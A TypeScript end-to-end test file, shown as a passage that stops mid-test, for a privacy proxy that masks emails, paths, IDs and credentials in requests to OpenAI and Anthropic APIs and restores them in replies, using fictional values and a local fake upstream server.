// End to end: a client talks to the proxy, the proxy talks to a fake upstream
// on 127.0.0.1 that answers with the placeholders it received, split into
// 3-character SSE chunks so every placeholder straddles chunk boundaries.
import { mkdtempSync, writeFileSync } from 'node:fs'
import { createServer, request } from 'node:http'
import type { IncomingHttpHeaders, Server } from 'node:http'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
import { DEFAULT_TOOL_RESTORE_CATEGORIES, loadConfig } from '../src/proxy/config.ts'
import type { ProxyConfig, RestoredCategories } from '../src/proxy/config.ts'
import { createProxyServer, listen, unusedPrivateUse } from '../src/proxy/server.ts'

// Every value is fictional: example.test addresses, a checksum-valid invented
// national ID, a made-up key, and a made-up home path.
const EMAIL = 'lin.fictional@example.test'
const HOME = '/Users/fictional-user'
const TWID = 'A123456789'
const KEY = 'sk-FICTIONALfictional0123456789abcd'
const QUOTED = 'Proj "Q"\\x'
const ORIGINALS = [EMAIL, HOME, TWID, KEY, QUOTED]

interface Seen {
  url: string
  headers: IncomingHttpHeaders
  raw: string
  body: any
}

type Reply = (seen: Seen) => { json?: unknown; sse?: string[]; status?: number; headers?: Record<string, string> }

let upstream: Server
let proxy: Server
let base = ''
let seen: Seen[] = []
let reply: Reply = () => ({ json: {} })
const logs: string[] = []

function chunk(text: string, size = 3): string[] {
  const out: string[] = []
  for (let i = 0; i < text.length; i += size) out.push(text.slice(i, i + size))
  return out
}

/** Placeholders in a received body, in order of first appearance. */
function placeholders(raw: string): string[] {
  return [...new Set(raw.match(/⟦[A-Z0-9_]+⟧/g) ?? [])]
}

async function start(overrides: Partial<ProxyConfig> = {}): Promise<void> {
  if (proxy !== undefined) await new Promise(resolve => proxy.close(resolve))
  const port = (upstream.address() as { port: number }).port
  const config = {
    ...loadConfig(undefined, {
      REDACTION_PROXY_OPENAI_UPSTREAM: `http://127.0.0.1:${port}`,
      REDACTION_PROXY_ANTHROPIC_UPSTREAM: `http://127.0.0.1:${port}/anthropic`,
    }),
    redaction: { projectNames: [QUOTED] },
    // These tests check how placeholders are restored, so every category reaches tool arguments unless a test sets the policy.
    toolRestore: { categories: '*' as const, tools: new Map() },
    ...overrides,
  }
  proxy = createProxyServer(config, line => logs.push(line))
  base = `http://127.0.0.1:${await listen(proxy, 0)}`
}

beforeAll(async () => {
  upstream = createServer((req, res) => {
    let raw = ''
    req.setEncoding('utf8')
    req.on('data', (part: string) => { raw += part })
    req.on('end', () => {
      const entry: Seen = { url: req.url ?? '', headers: req.headers, raw, body: raw === '' ? undefined : JSON.parse(raw) }
      seen.push(entry)
      const answer = reply(entry)
      if (answer.sse !== undefined) {
        res.writeHead(answer.status ?? 200, { 'content-type': 'text/event-stream' })
        // Split the wire bytes as well, so event boundaries also straddle reads.
        const wire = answer.sse.join('')
        let i = 0
        const pump = (): void => {
          if (i >= wire.length) return void res.end()
          res.write(wire.slice(i, i + 7))
          i += 7
          setImmediate(pump)
        }
        pump()
        return
      }
      res.writeHead(answer.status ?? 200, { 'content-type': 'application/json', ...answer.headers })
      res.end(JSON.stringify(answer.json))
    })
  })
  await new Promise<void>(resolve => upstream.listen(0, '127.0.0.1', resolve))
  await start()
})

afterAll(async () => {
  await new Promise(resolve => proxy.close(resolve))
  await new Promise(resolve => upstream.close(resolve))
})

beforeEach(() => {
  seen = []
  logs.length = 0
})

function sse(events: Array<[string | undefined, unknown]>): string[] {
  return events.map(([name, data]) => `${name === undefined ? '' : `event: ${name}\n`}data: ${typeof data === 'string' ? data : JSON.stringify(data)}\n\n`)
}

async function post(path: string, body: unknown, headers: Record<string, string> = {}): Promise<Response> {
  return fetch(base + path, { method: 'POST', headers: { 'content-type': 'application/json', ...headers }, body: JSON.stringify(body) })
}

function events(text: string): any[] {
  return text.split('\n\n').filter(block => block.includes('data: ') && !block.includes('[DONE]'))
    .map(block => JSON.parse(block.split('\n').find(line => line.startsWith('data: '))!.slice(6)))
}

const USER_TEXT = `Mail ${EMAIL} the file ${HOME}/notes.md, ID ${TWID}, key ${KEY}, project ${QUOTED}.`

function expectMasked(entry: Seen): string[] {
  for (const original of ORIGINALS) {
    expect(entry.raw).not.toContain(original)
    expect(entry.raw).not.toContain(JSON.stringify(original).slice(1, -1))
  }
  const found = placeholders(entry.raw)
  expect(found.length).toBeGreaterThanOrEqual(5)
  return found
}

describe('OpenAI Chat Completions', () => {
  const request = {
    model: 'm',
    messages: [{ role: 'system', content: 'You are terse.' }, { role: 'user', content: USER_TEXT }],
    tools: [{ type: 'function', function: { name: 'send', description: 'send mail', parameters: { type: 'object' } } }],
  }

  it('masks the request, forwards credentials, and restores a JSON reply', async () => {
    reply = entry => {
      const ids = placeholders(entry.raw)
      return {
        json: {
          id: 'c1',
          choices: [{
            index: 0,
            message: {
              role: 'assistant',
              content: `Echo: ${ids.join(' ')}`,
              tool_calls: [{ id: 't1', type: 'function', function: { name: 'send', arguments: JSON.stringify({ to: ids, unknown: '⟦EMAIL_99⟧' }) } }],
            },
            finish_reason: 'tool_calls',
          }],
        },
      }
    }
    const res = await post('/v1/chat/completions', request, { authorization: 'Bearer client-key' })
    expect(res.status).toBe(200)
    const [entry] = seen
    expect(entry!.headers.authorization).toBe('Bearer client-key')
    expect(entry!.headers['accept-encoding']).toBe('identity')
    const ids = expectMasked(entry!)
    const body = await res.json() as any
    const message = body.choices[0].message
    for (const original of ORIGINALS) expect(message.content).toContain(original)
    const args = JSON.parse(message.tool_calls[0].function.arguments)
    expect(args.to).toHaveLength(ids.length)
    expect(args.to).toEqual(expect.arrayContaining([EMAIL, HOME, TWID, KEY, QUOTED]))
    expect(args.unknown).toBe('⟦EMAIL_99⟧')
    expect(logs.join('\n')).not.toContain(EMAIL)
    expect(logs.at(-1)).toMatch(/-> 200 masked \d+ \(.*EMAIL 1.*\) restored \d+ unknown 1/)
  })

  it('restores a streamed reply across chunk boundaries, including tool-call JSON', async () => {
    reply = entry => {
      const ids = placeholders(entry.raw)
      const content = `Echo: ${ids.join(' and ')} done`
      const args = JSON.stringify({ to: ids })
      const env = { id: 'c2', object: 'chat.completion.chunk', model: 'm' }
      return {
        sse: [
          ...sse(chunk(content).map(part => [undefined, { ...env, choices: [{ index: 0, delta: { content: part }, finish_reason: null }] }])),
          ...sse(chunk(args).map(part => [undefined, { ...env, choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { arguments: part } }] }, finish_reason: null }] }])),
          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: { content: ' tail ⟦EMAIL_1' }, finish_reason: null }] }]]),
          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: { content: ' end ⟦PATH_1' }, finish_reason: 'stop' }] }], [undefined, '[DONE]']]),
        ],
      }
    }
    const res = await post('/v1/chat/completions', { ...request, stream: true })
    const text = await res.text()
    expect(text.trimEnd().endsWith('data: [DONE]')).toBe(true)
    const deltas = events(text).flatMap(event => event.choices.map((choice: any) => choice.delta))
    const content = deltas.map(delta => delta.content ?? '').join('')
    const args = deltas.flatMap(delta => delta.tool_calls ?? []).map((call: any) => call.function.arguments).join('')
    expect(content).toContain(`Echo: `)
    for (const original of ORIGINALS) expect(content).toContain(original)
    // Unclosed placeholders are released as text in order, the last one inside the finishing chunk.
    expect(content.endsWith(' tail ⟦EMAIL_1 end ⟦PATH_1')).toBe(true)
    expect(JSON.parse(args).to).toEqual(expect.arrayContaining(ORIGINALS))
    expect(text).not.toMatch(/⟦(?:EMAIL|PATH|TWID|KEY|PROJECT)_\d+⟧/)
  })

  it('numbers the request head (tools, system) before the messages', async () => {
    reply = () => ({ json: { choices: [] } })
    const other = 'wang.fictional@example.test'
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `to ${EMAIL}` }], tools: [{ type: 'function', function: { name: 'f', description: `cc ${other}` } }] })
    expect(seen[0]!.body.tools[0].function.description).toBe('cc ⟦EMAIL_1⟧')
    expect(seen[0]!.body.messages[0].content).toBe('to ⟦EMAIL_2⟧')
  })

  it('keeps identities stable across turns of one conversation', async () => {
    reply = () => ({ json: { choices: [] } })
    const turn1 = { model: 'm', messages: [{ role: 'user', content: `a ${EMAIL}` }] }
    const turn2 = { model: 'm', messages: [...turn1.messages, { role: 'assistant', content: `ok ${EMAIL}` }, { role: 'user', content: `b ${TWID} ${EMAIL}` }] }
    await post('/v1/chat/completions', turn1)
    await post('/v1/chat/completions', turn2)
    expect(seen[0]!.body.messages[0].content).toBe('a ⟦EMAIL_1⟧')
    expect(seen[1]!.body.messages.map((message: any) => message.content)).toEqual(['a ⟦EMAIL_1⟧', 'ok ⟦EMAIL_1⟧', 'b ⟦TWID_1⟧ ⟦EMAIL_1⟧'])
  })
})

describe('Anthropic Messages', () => {
  const thinking = { type: 'thinking', thinking: `about ⟦EMAIL_1⟧ and ${EMAIL.length}`, signature: 'sig==' }
  const request = {
    model: 'claude',
    max_tokens: 100,
    system: [{ type: 'text', text: `cwd ${HOME}/repo` }],
    messages: [
      { role: 'user', content: [{ type: 'text', text: USER_TEXT }] },
      { role: 'assistant', content: [thinking, { type: 'tool_use', id: 'tu1', name: 'read', input: { path: `${HOME}/repo/a.md` } }] },
      { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'tu1', content: `owner ${EMAIL}` }, { type: 'image', source: { type: 'base64', media_type: 'image/png', data: 'iVBORw0KGgo=' } }] },
    ],
    metadata: { user_id: 'user_abc' },
  }

  it('masks text and tool input, resends signed thinking unchanged, and restores a stream', async () => {
    reply = entry => {
      const ids = placeholders(entry.raw).filter(id => id !== '⟦EMAIL_1⟧' || true)
      const text = `Echo ${ids.join(' ')}`
      const input = JSON.stringify({ path: `${ids.find(id => id.startsWith('⟦PATH'))}/b.md`, note: ids.find(id => id.startsWith('⟦PROJECT')) })
      return {
        sse: sse([
          ['message_start', { type: 'message_start', message: { id: 'm1', role: 'assistant', content: [], model: 'claude' } }],
          ['content_block_start', { type: 'content_block_start', index: 0, content_block: { type: 'thinking', thinking: '' } }],
          ['content_block_delta', { type: 'content_block_delta', index: 0, delta: { type: 'thinking_delta', thinking: 'mask ⟦EMAIL_1⟧ seen' } }],
          ['content_block_delta', { type: 'content_block_delta', index: 0, delta: { type: 'signature_delta', signature: 'sig2' } }],
          ['content_block_stop', { type: 'content_block_stop', index: 0 }],
          ['content_block_start', { type: 'content_block_start', index: 1, content_block: { type: 'text', text: '' } }],
          ...chunk(`${text} tail ⟦PATH`).map((part): [string, unknown] => ['content_block_delta', { type: 'content_block_delta', index: 1, delta: { type: 'text_delta', text: part } }]),
          ['content_block_stop', { type: 'content_block_stop', index: 1 }],
          ['content_block_start', { type: 'content_block_start', index: 2, content_block: { type: 'tool_use', id: 'tu2', name: 'read', input: {} } }],
          ...chunk(input, 2).map((part): [string, unknown] => ['content_block_delta', { type: 'content_block_delta', index: 2, delta: { type: 'input_json_delta', partial_json: part } }]),
          ['content_block_stop', { type: 'content_block_stop', index: 2 }],
          ['message_delta', { type: 'message_delta', delta: { stop_reason: 'tool_use' } }],
          ['message_stop', { type: 'message_stop' }],
        ]),
      }
    }
    const res = await post('/v1/messages', { ...request, stream: true }, { 'x-api-key': 'client-key', 'anthropic-version': '2023-06-01' })
    expect(res.status).toBe(200)
    const [entry] = seen
    expect(entry!.url).toBe('/anthropic/v1/messages')
    expect(entry!.headers['x-api-key']).toBe('client-key')
    expectMasked(entry!)
    expect(entry!.body.messages[1].content[0]).toEqual(thinking)
    expect(entry!.body.messages[1].content[1].input.path).toMatch(/^⟦PATH_\d+⟧\/repo\/a\.md$/)
    expect(entry!.body.messages[2].content[1].source.data).toBe('iVBORw0KGgo=')
    expect(entry!.body.metadata).toEqual({ user_id: 'user_abc' })

    const all = events(await res.text())
    const text = all.filter(e => e.delta?.type === 'text_delta').map(e => e.delta.text).join('')
    const json = all.filter(e => e.delta?.type === 'input_json_delta').map(e => e.delta.partial_json).join('')
    const thought = all.filter(e => e.delta?.type === 'thinking_delta').map(e => e.delta.thinking).join('')
    for (const original of ORIGINALS) expect(text).toContain(original)
    expect(text.endsWith(' tail ⟦PATH')).toBe(true)
    expect(JSON.parse(json)).toEqual({ path: `${HOME}/b.md`, note: QUOTED })
    expect(thought).toBe('mask ⟦EMAIL_1⟧ seen')
  })

  it('restores a JSON reply: text and tool input, not signed thinking', async () => {
    reply = entry => {
      const ids = placeholders(entry.raw)
      const path = ids.find(id => id.startsWith('⟦PATH'))
      return {
        json: {
          id: 'm2', type: 'message', role: 'assistant', model: 'claude', stop_reason: 'tool_use',
          content: [
            { type: 'thinking', thinking: `consider ${path}`, signature: 'sig3' },
            { type: 'text', text: `Reading ${path}/c.md for ${ids.find(id => id.startsWith('⟦EMAIL'))}` },
            { type: 'tool_use', id: 'tu3', name: 'read', input: { path: `${path}/c.md`, tags: [ids.find(id => id.startsWith('⟦PROJECT'))] } },
          ],
        },
      }
    }
    const res = await post('/v1/messages', request, { 'x-api-key': 'k' })
    const body = await res.json() as any
    expect(body.content[0].thinking).toMatch(/^consider ⟦PATH_\d+⟧$/)
    expect(body.content[1].text).toBe(`Reading ${HOME}/c.md for ${EMAIL}`)
    expect(body.content[2].input).toEqual({ path: `${HOME}/c.md`, tags: [QUOTED] })
  })

  it('masks a plain-text document and objects under keys whose strings it skips', async () => {
    reply = () => ({ json: { content: [] } })
    const document = { type: 'document', source: { type: 'text', media_type: 'text/plain', data: `Customer file. Email ${EMAIL}, ID ${TWID}` } }
    const properties = { name: { type: 'string', description: `defaults to ${EMAIL}` }, data: { type: 'string', description: `owner ${TWID}` } }
    const res = await post('/v1/messages', {
      model: 'claude', max_tokens: 1, stop_sequences: ['END'], metadata: { user_id: 'user_abc' },
      tools: [{ name: 'lookup', input_schema: { type: 'object', properties } }],
      messages: [{ role: 'user', content: [document, { type: 'text', text: 'Summarize the file.' }] }],
    }, { 'x-api-key': 'k' })
    expect(res.status).toBe(200)
    const [entry] = seen
    expect(entry!.raw).not.toContain(EMAIL)
    expect(entry!.raw).not.toContain(TWID)
    expect(entry!.body.messages[0].content[0].source).toEqual({ type: 'text', media_type: 'text/plain', data: 'Customer file. Email ⟦EMAIL_1⟧, ID ⟦TWID_1⟧' })
    expect(entry!.body.stop_sequences).toEqual(['END'])
    expect(entry!.body.metadata).toEqual({ user_id: 'user_abc' })
  })

  it('masks count_tokens requests too', async () => {
    reply = () => ({ json: { input_tokens: 42 } })
    const res = await post('/v1/messages/count_tokens', request, { 'x-api-key': 'k' })
    expect(await res.json()).toEqual({ input_tokens: 42 })
    expectMasked(seen[0]!)
  })
})

describe('OpenAI Responses', () => {
  it('restores a stream and keeps identities for a previous_response_id continuation', async () => {
    reply = entry => {
      const ids = placeholders(entry.raw)
      const text = `Echo ${ids.join(' ')}`
      const args = JSON.stringify({ to: ids[0] })
      return {
        sse: sse([
          ['response.created', { type: 'response.created', response: { id: 'r1', output: [] } }],
          ...chunk(text).map((part): [string, unknown] => ['response.output_text.delta', { type: 'response.output_text.delta', item_id: 'i1', output_index: 0, content_index: 0, delta: part }]),
          ['response.output_text.done', { type: 'response.output_text.done', item_id: 'i1', output_index: 0, content_index: 0, text }],
          ...chunk(args).map((part): [string, unknown] => ['response.function_call_arguments.delta', { type: 'response.function_call_arguments.delta', item_id: 'i2', output_index: 1, delta: part }]),
          ['response.function_call_arguments.done', { type: 'response.function_call_arguments.done', item_id: 'i2', output_index: 1, arguments: args }],
          ['response.completed', { type: 'response.completed', response: { id: 'r1', output: [{ type: 'message', content: [{ type: 'output_text', text }] }] } }],
        ]),
      }
    }
    const res = await post('/v1/responses', { model: 'm', stream: true, instructions: `cwd ${HOME}`, input: [{ role: 'user', content: [{ type: 'input_text', text: USER_TEXT }] }] })
    expectMasked(seen[0]!)
    const all = events(await res.text())
    const streamed = all.filter(e => e.type === 'response.output_text.delta').map(e => e.delta).join('')
    const done = all.find(e => e.type === 'response.output_text.done').text
    const completed = all.find(e => e.type === 'response.completed').response.output[0].content[0].text
    expect(streamed).toBe(done)
    expect(completed).toBe(done)
    for (const original of ORIGINALS) expect(done).toContain(original)
    const args = all.filter(e => e.type === 'response.function_call_arguments.delta').map(e => e.delta).join('')
    expect(JSON.parse(args)).toEqual(JSON.parse(all.find(e => e.type === 'response.function_call_arguments.done').arguments))

    reply = () => ({ json: { id: 'r2', output: [] } })
    await post('/v1/responses', { model: 'm', previous_response_id: 'r1', input: `again ${EMAIL} and new ${'B123456780'}` })
    const firstEmail = seen[0]!.raw.match(/⟦EMAIL_\d+⟧/)![0]
    expect(seen[1]!.body.input).toMatch(new RegExp(`^again ${firstEmail} and new ⟦TWID_2⟧$`))
  })
})

describe('state kept per client credential', () => {
  const PASS = 'Tr0ub4dor&3x'

  it('masks a value it restored earlier once later history drops the context that detected it', async () => {
    reply = () => ({ json: { choices: [{ index: 0, message: { role: 'assistant', content: 'Noted. Use ⟦KEY_1⟧ to log in.' } }] } })
    const first = await (await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `password: ${PASS}` }] }, { authorization: 'Bearer client-a' })).json() as any
    const echo = first.choices[0].message.content
    expect(echo).toBe(`Noted. Use ${PASS} to log in.`)
    reply = () => ({ json: { choices: [] } })
    const compacted = { model: 'm', messages: [{ role: 'assistant', content: echo }, { role: 'user', content: 'and the username?' }] }
    await post('/v1/chat/completions', compacted, { authorization: 'Bearer client-a' })
    expect(seen[1]!.raw).not.toContain(PASS)
    expect(seen[1]!.body.messages[0].content).toBe('Noted. Use ⟦KEY_1⟧ to log in.')
  })

  it('refuses a continuation of another client\'s response', async () => {
    reply = () => ({ json: { id: 'resp_client_a', output: [] } })
    await post('/v1/responses', { model: 'm', input: `mail ${EMAIL}` }, { authorization: 'Bearer client-a' })
    reply = () => ({ json: { id: 'resp_b', output: [{ type: 'message', content: [{ type: 'output_text', text: 'It was ⟦EMAIL_1⟧' }] }] } })
    const other = await post('/v1/responses', { model: 'm', previous_response_id: 'resp_client_a', input: 'what address?' }, { authorization: 'Bearer client-b' })
    expect(other.status).toBe(422)
    expect(seen).toHaveLength(1)
    const owner = await post('/v1/responses', { model: 'm', previous_response_id: 'resp_client_a', input: 'what address?' }, { authorization: 'Bearer client-a' })
    expect((await owner.json() as any).output[0].content[0].text).toBe(`It was ${EMAIL}`)
  })

  it('masks a remembered credential in any ASCII case', async () => {
    const client = { authorization: 'Bearer client-case' }
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `password: ${PASS}` }] }, client)
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'assistant', content: `use ${PASS.toLowerCase()} or ${PASS.toUpperCase()}` }, { role: 'user', content: 'ok' }] }, client)
    expect(seen[1]!.raw.toLowerCase()).not.toContain(PASS.toLowerCase())
    expect(seen[1]!.body.messages[0].content).toMatch(/^use ⟦KEY_\d+⟧ or ⟦KEY_\d+⟧$/)
  })

  it('remembers only values long enough to propagate on their own, while masking a short credential throughout its own request', async () => {
    const client = { authorization: 'Bearer client-short' }
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: 'password: ab12x, again ab12x' }] }, client)
    expect(seen[0]!.body.messages[0].content).toMatch(/^password: ⟦KEY_1⟧, again ⟦KEY_1⟧$/)
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: 'the label ab12x' }] }, client)
    expect(seen[1]!.body.messages[0].content).toBe('the label ab12x')
  })

  it('masks a password spelled like a protocol field name in its own request, but does not search later requests for it', async () => {
    const client = { authorization: 'Bearer client-protocol' }
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: 'password: "web_server" and DB_PASSWORD=data_store' }] }, client)
    expect(seen[0]!.body.messages[0].content).toMatch(/^password: "⟦KEY_\d+⟧" and DB_PASSWORD=⟦KEY_\d+⟧$/)
    const later = await post('/v1/chat/completions', { model: 'm', web_server: 'x', data_store: 'x', messages: [{ role: 'user', content: 'please move web_server to data_store' }] }, client)
    expect(later.status).toBe(200)
    expect(seen[1]!.body.messages[0].content).toBe('please move web_server to data_store')
  })

  it('forwards a password spelled like an API field name next to that field, in any form', async () => {
    const chat = { model: 'm', top_p: 1, temperature: 0, messages: [{ role: 'user', content: 'password: top_p, {"password":"temperature"}' }] }
    expect((await post('/v1/chat/completions', chat, { authorization: 'Bearer client-field' })).status).toBe(200)
    expect(seen[0]!.body.messages[0].content).toBe(chat.messages[0]!.content)
    const result = '{"password":"max_tokens"}\nDB_PASSWORD=cache_control'
    const messages = [
      { role: 'assistant', content: [{ type: 'tool_use', id: 'toolu_1', name: 'read', input: {} }] },
      { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'toolu_1', content: result, cache_control: { type: 'ephemeral' } }] },
    ]
    expect((await post('/v1/messages', { model: 'c', max_tokens: 1, messages }, { 'x-api-key': 'k' })).status).toBe(200)
    expect(seen[1]!.body.messages[1].content[0].content).toBe(result)
  })

  it('names the category of a value this request detected that is still unmasked, never the value, and does not count a remembered one', async () => {
    const client = { authorization: 'Bearer client-leak' }
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `password: ${PASS}` }] }, client)
    const res = await post('/v1/chat/completions', { model: 'm', metadata: { note: PASS, owner: EMAIL }, messages: [{ role: 'user', content: `echo ${PASS} to ${EMAIL}` }] }, client)
    expect(res.status).toBe(422)
    const { message } = (await res.json() as any).error
    expect(message).toBe('a detected value is still unmasked at /metadata/owner (EMAIL); the request was not forwarded')
    expect(seen).toHaveLength(1)
  })

  it('does not count a detected value written in a protocol enum field such as role or type', async () => {
    await start({ redaction: { terms: ['assistant', 'json_object'] } })
    try {
      const res = await post('/v1/chat/completions', {
        model: 'm',
        response_format: { type: 'json_object' },
        messages: [{ role: 'user', content: 'what did the assistant say, as json_object?' }, { role: 'assistant', content: 'nothing' }],
      })
      expect(res.status).toBe(200)
      expect(seen[0]!.body.messages[0].content).toMatch(/^what did the ⟦TERM_\d+⟧ say, as ⟦TERM_\d+⟧\?$/)
      const inMetadata = await post('/v1/chat/completions', { model: 'm', metadata: { status: 'json_object' }, messages: [{ role: 'user', content: 'as json_object' }] })
      expect(inMetadata.status).toBe(422)
    } finally {
      await start()
    }
  })

  it('refuses a detected value in an enum-named field when it is no enum value, or sits in metadata', async () => {
    const user = { role: 'user', content: `password: ${PASS} mail ${EMAIL} file ${HOME}/notes.md` }
    for (const extra of [{ metadata: { status: PASS } }, { metadata: { user: { type: PASS } } }, { tool_choice: PASS }, { reasoning_effort: PASS }, { service_tier: EMAIL }]) {
      expect((await post('/v1/chat/completions', { model: 'm', messages: [user], ...extra })).status).toBe(422)
    }
    expect(seen).toHaveLength(0)
  })

  it('masks every string of a resent tool input, whatever its key, but not the tool call\'s own protocol fields', async () => {
    reply = () => ({ json: {} })
    const user = { role: 'user', content: `password: ${PASS} mail ${EMAIL} file ${HOME}/notes.md` }
    const input = { role: EMAIL, status: `${HOME}/notes.md`, name: EMAIL, url: `${HOME}/x`, type: PASS, data: 'AAAA' }
    const resent = await post('/v1/messages', {
      model: 'c',
      max_tokens: 1,
      messages: [
        user,
        { role: 'assistant', content: [{ type: 'tool_use', id: 't1', name: 'assign', input }] },
        { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't1', content: 'ok' }] },
      ],
    }, { 'x-api-key': 'k' })
    expect(resent.status).toBe(200)
    const block = seen[0]!.body.messages[1].content[0]
    expect(block).toMatchObject({ type: 'tool_use', id: 't1', name: 'assign', input: { data: 'AAAA' } })
    expect(block.input.role).toMatch(/^⟦EMAIL_\d+⟧$/)
    expect(block.input.status).toMatch(/^⟦PATH_\d+⟧\/notes\.md$/)
    expect(block.input.name).toBe(block.input.role)
    expect(block.input.url).toMatch(/^⟦PATH_\d+⟧\/x$/)
    expect(block.input.type).toMatch(/^⟦KEY_\d+⟧$/)

    const item = { type: 'local_shell_call', id: 'ls', call_id: 'c1', status: 'completed', action: { type: 'exec', command: ['cat', `${HOME}/x`], env: { name: EMAIL } } }
    const responses = await post('/v1/responses', { model: 'm', input: [{ role: 'user', content: [{ type: 'input_text', text: user.content }] }, item] })
    expect(responses.status).toBe(200)
    const sent = seen[1]!.body.input[1]
    expect(sent).toMatchObject({ type: 'local_shell_call', id: 'ls', call_id: 'c1', status: 'completed', action: { type: 'exec' } })
    expect(sent.action.command[1]).toMatch(/^⟦PATH_\d+⟧\/x$/)
    expect(sent.action.env.name).toMatch(/^⟦EMAIL_\d+⟧$/)
  })

  it('keeps remembered credentials through a flood of another category or from a tool result, and forgets the oldest beyond 4096 the user wrote', async () => {
    reply = () => ({ json: { choices: [] } })
    const flood = (count: number, line: (i: number) => string): string => Array.from({ length: count }, (_, i) => line(i)).join('\n')
    const echoed = async (client: Record<string, string>, message: Record<string, string>): Promise<string> => {
      seen = []
      await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `password: ${PASS}` }] }, client)
      await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: 'dump' }, message] }, client)
      await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'assistant', content: `Noted ${PASS}.` }, { role: 'user', content: 'and?' }] }, client)
      return seen[2]!.body.messages[0].content
    }
    const tool = (content: string) => ({ role: 'tool', tool_call_id: 't', content })
    const cookies = flood(4200, i => `GET /api/x HTTP/1.1\nCookie: sessionid=s${String(i).padStart(5, '0')}f8a9c2d1e4b7a6c3\n`)
    expect(await echoed({ authorization: 'Bearer flood-mail' }, tool(flood(4100, i => `user${i}@example.test`)))).toMatch(/^Noted ⟦KEY_\d+⟧\.$/)
    expect(await echoed({ authorization: 'Bearer flood-cookies' }, tool(cookies))).toMatch(/^Noted ⟦KEY_\d+⟧\.$/)
    expect(await echoed({ authorization: 'Bearer flood-keys-4095' }, { role: 'user', content: flood(4095, i => `password: fake${i}zzzz`) })).toMatch(/^Noted ⟦KEY_\d+⟧\.$/)
    expect(await echoed({ authorization: 'Bearer flood-keys-4096' }, { role: 'user', content: flood(4096, i => `password: fake${i}zzzz`) })).toBe(`Noted ${PASS}.`)
  })

  it('masks a remembered credential that a tool call resends JSON-escaped, under the identity of its plain spelling', async () => {
    const client = { authorization: 'Bearer client-escaped' }
    const pw = 'p@ss\\word12'
    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', tool_calls: [{ id: 'c', type: 'function', function: { name: 'bash', arguments: JSON.stringify({ cmd: `echo ${placeholders(entry.raw)[0]}` }) } }] } }] } })
    const first = await (await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `password: ${pw}` }] }, client)).json() as any
    const call = first.choices[0].message
    expect(JSON.parse(call.tool_calls[0].function.arguments).cmd).toBe(`echo ${pw}`)
    const result = { role: 'tool', tool_call_id: 'c', content: 'ok' }
    expect((await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `password: ${pw}` }, call, result] }, client)).status).toBe(200)
    expect(seen[1]!.body.messages[1].tool_calls[0].function.arguments).toBe('{"cmd":"echo ⟦KEY_1⟧"}')
    // The history no longer holds the plain spelling: the escaped one is bound first, and restores as the plain one.
    const pruned = await (await post('/v1/chat/completions', { model: 'm', messages: [call, result] }, client)).json() as any
    expect(seen[2]!.raw).not.toContain('word12')
    expect(seen[2]!.body.messages[0].tool_calls[0].function.arguments).toBe('{"cmd":"echo ⟦KEY_1⟧"}')
    expect(JSON.parse(pruned.choices[0].message.tool_calls[0].function.arguments).cmd).toBe(`echo ${pw}`)
  })

  it('masks a resent tool input under keys named data, thinking, signature, or encrypted_content, at any depth', async () => {
    reply = () => ({ json: {} })
    const user = { role: 'user', content: `password: ${PASS} mail ${EMAIL} file ${HOME}/notes.md` }
    const input = { data: `home is ${HOME}`, thinking: EMAIL, signature: PASS, encrypted_content: EMAIL, payload: { data: `${HOME}/x` }, files: [{ data: `${HOME}/a` }] }
    const resent = await post('/v1/messages', {
      model: 'c',
      max_tokens: 1,
      messages: [
        user,
        { role: 'assistant', content: [{ type: 'tool_use', id: 't1', name: 'write_file', input }] },
        { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't1', content: 'ok' }] },
      ],
    }, { 'x-api-key': 'k' })
    expect(resent.status).toBe(200)
    const sent = seen[0]!.body.messages[1].content[0].input
    expect(sent.data).toMatch(/^home is ⟦PATH_\d+⟧$/)
    expect(sent.thinking).toMatch(/^⟦EMAIL_\d+⟧$/)
    expect(sent.signature).toMatch(/^⟦KEY_\d+⟧$/)
    expect(sent.encrypted_content).toBe(sent.thinking)
    expect(sent.payload.data).toMatch(/^⟦PATH_\d+⟧\/x$/)
    expect(sent.files[0].data).toMatch(/^⟦PATH_\d+⟧\/a$/)

    const item = { type: 'local_shell_call', id: 'ls', call_id: 'c1', status: 'completed', action: { type: 'exec', command: ['ls'], env: { data: `${HOME}/y` } } }
    expect((await post('/v1/responses', { model: 'm', input: [user, item] })).status).toBe(200)
    expect(seen[1]!.body.input[1].action.env.data).toMatch(/^⟦PATH_\d+⟧\/y$/)
  })

  it('refuses a bound value glued into an enum-like string under tool input', async () => {
    const res = await post('/v1/messages', {
      model: 'c',
      max_tokens: 1,
      messages: [
        { role: 'user', content: 'password: secret_token1' },
        { role: 'assistant', content: [{ type: 'tool_use', id: 't1', name: 'set', input: { type: 'xsecret_token1' } }] },
        { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't1', content: 'ok' }] },
      ],
    }, { 'x-api-key': 'k' })
    expect(res.status).toBe(422)
    expect((await res.json() as any).error.message).toContain('/messages/1/content/0/input/type (KEY)')
  })

  it('masks a remembered value only where it stands alone, and forwards it glued, suffixed, upper-cased and JSON-escaped, or in metadata', async () => {
    const client = { authorization: 'Bearer client-glued' }
    const pw = 'p@ss\\word12'
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `password: football and password: ${PASS} and password: ${pw}` }] }, client)
